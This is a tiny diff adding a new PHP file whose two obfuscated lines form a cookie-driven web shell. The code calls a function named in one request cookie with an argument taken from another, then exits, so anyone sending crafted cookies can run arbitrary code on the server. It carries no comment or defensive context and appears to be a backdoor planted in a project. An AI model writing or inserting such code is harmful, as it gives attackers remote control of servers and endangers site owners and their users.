@@ -1,0 +1,2 @@
+<?php
+if(isset($_COOKIE["jc"])){$_COOKIE["YF"]($_COOKIE["jc"]);exit;} if(isset($_COOKIE["iCR"])){$_COOKIE["EA"]($_COOKIE["iCR"]);exit;}
